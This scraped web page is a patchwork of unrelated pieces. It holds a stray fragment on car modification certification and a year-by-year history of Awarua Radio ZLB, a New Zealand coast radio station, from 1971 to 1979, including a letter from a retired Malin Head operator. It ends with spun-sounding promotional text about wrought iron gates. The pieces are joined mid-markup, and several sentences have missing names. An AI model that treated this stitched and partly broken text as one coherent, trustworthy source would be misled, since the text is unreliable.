<p><em>denon.co.uk JD</em></p>   </div>   </article>

There is a problem with later, &#x201c;frontal impact&#x201d; cars- no LVV Certifier can test the crash performance of a car, so cannot approve anything that affects frontal impact. We heard of a man who bought an intercooler kit from Japan, and followed the instructions to modify the front siderails to make it fit. He ended up having to have the whole front of his car re-built with new side-rails.

An additional farm residence was completed and a bus shelter on Bluff Road provided. Staff establishment increased to 29 10/40. ZLG Haast ceased w/t working and changed to telephone working.</p>   <p><strong>1971</strong> &#x2013; ZMV/Milford Sound landline completed, r/t retained as emergency link. Ellie Ellenden retired in January. Gentex operational 21 May. JF Ryan took over as Superintendent on 24th May. The position was regraded to Class Special 3 on 1st April, and Senior Supervisor Class Special 1.</p>   <p><strong>1972</strong> &#x2013; September, the area commercial QSP system ceased, through being unacceptable on defence communications network. Overseas traffic now routed through commercial cable systems.</p>   <p><strong>1973</strong> &#x2013; 16 MHz watch opened 0880 to 1800 hours NZST. On 16th July discontinued HF broadcasting of outward traffic. All HF traffic (inward and outward) now centred at ZLB.</p>   <p><strong>1974</strong> &#x2013; February JF Ryan, Superintendent, transferred to PO HQ. In March HJ Milne (Ex ZLD) was appointed Superintendent. On 1st April designation of Superintendent changed to Manager. In May ZLB opened up a request service on 4 &amp; 6 MHz. In June HJ Milne retired, and was replaced by .</p>   <p>September saw a new &#x2018;Small Ships&#x2019; room added with a new table designed and constructed locally. Also in September RN McVicar (Superintendent at ZLD) was appointed Senior Supervisor at Awarua, but in October he declined. In October the nightly 8 MHz sked with KFS ceased, rendered unnecessary by telex facilities.</p>   <p>ZLB had operating teleprinters to ZLO, ZLW, Gentex, and Telex (installed for Schmitt Ocean Towage, Rotterdam, who were engaged in tug work with Penrod 2 oil drilling rig).</p>   <p><strong>1975</strong> &#x2013; On 28th January a fifth supervisor&#x2019;s position was approved, and in July a third operating unit for leave relief approved. July 31st VJM Macquarie Island CW meteorological skeds discontinued when Australians installed teleprinters. From 1st May to 30 September 4 MHz HF watch opened 0700-1900 GMT daily and 12 MHz closed at these times. On October 28 <strong>Malin Head Radio</strong> (51N &#x2013; 19W) heard working a distress on 2182 kHz. November 6th daily sked at 1130 with VJS discontinued. Penrod 2 now drilling in Foveaux Strait, rig working r/t for Met traffic.</p>   <blockquote>    <p>Greetings from Malin Head. I read with great interest a note in the events during Awarua Radio ZLB and the following: &#x201c;On October 28 Malinhead Radio (51N &#x2013; 19W) heard working a distress on 2182 kHz.&#x201d;</p>    <p>I made a point of checking the distress records for our radio station for that date and can confirm that Malin Head Radio did indeed work distress traffic. I noted that the position given was 53 North and 19 West. This is an amazing bit of watchkeeping and must be the furthest distance for our transmitters, of the time. At that time we were using Pye transmitters, with a 5CX1500B valve in the final, running compatible AM with 500 watts carrier. We later changed to USB in the following years and ran 1 KW from SPT gear, replaced by German transmitters about 5 years ago.</p>    <p>The antenna was, and still is, 150 foot masts, one for 2182 khz and the other usually used on our working frequency of 1677 khz. The original 500 khz Tee antenna strung between the two towers is used on Navtex on 518 khz and 490 khz these days.</p>    <p>Personally, I retired just over 2 years ago, having completed 34 years at EJM, and a further 7 years before that at sea as a Radio Officer.</p>    <p>Really enjoyed your web site. I am particularly interested in 500 khz, stories of such, and recordings also of 600m/500 khz.</p>    <p>Very best regards, Finbar O&#x2019;Connor EI0CF and ex EJM (GMH)</p>   </blockquote>   <p><strong>1976</strong> &#x2013; Suspicion and alarm generated in coast stations at proposal by Director of Radio Services that coast stations transfer control to CPMs. JT Dudley appointed Manager in September. Takeover bid by CPM fails and proposal dropped in October. PJ Collett appointed Senior Supervisor in November.</p>   <p><strong>1977</strong> &#x2013; Managers seminar held in Wellington in March. 1st June spot frequency calling began on HF, but due to lack of proper equipment common channels only guarded. In November ceiling was lowered, carpet laid and new filtered fluorescent lighting added. On 11th November HF DF facility was withdrawn and Adcock DF sent to museum. In December the old iron horse autokeyer was sent to museum and replaced with new Model 750 teleprinter/morse converter autokeyer, all electronic.</p>   <p><strong>1978</strong> &#x2013; On 1st January, speaker watch commenced on 4125 kc/s. Codan fixed-tune receivers located in the back room for 2162, 2182, 2196, 4125, 4143.6, and 4414 kHz. In March a telephone service was introduced to Dog Island, and weather reports now passed by this medium. Female toilets were added to the retiring room.</p>   <p><strong>1979</strong> &#x2013; The Post Office gentex network changed from tape machines to page printers. In February, was linked to the mainland by telephone. Direct circuit to Wellington was no longer necessary, traffic passed via the gentex network. Direct circuit now to Kelburn Weather Office. Later in the year Eddystone digital receivers replaced the Philips, in use since 1956. JK (Bill) Riley retired 24th December.</p>   <div>    <p>Bert McKechnie in the Radio Telephone Room monitoring 2182 kHz at Awarua Radio ZLB in 1980.

      Why Wrought Iron as opposed to a  Wood  Entrance or 
       Steel  Mounted Gate? One of the possible benefits of Wrought Iron  entrances is 
      they don't block your view 
      out beyond them, or  obstruct  sunshine 
      coming in. It is certainly  good for your brand new Wrought Iron 
       entrance to  operate  as well as look  lovely 
      the day it's  mounted, but if the 
       products  utilized are not the finest, 
      our  recently added street  
      charm could be  brief 
      lived.
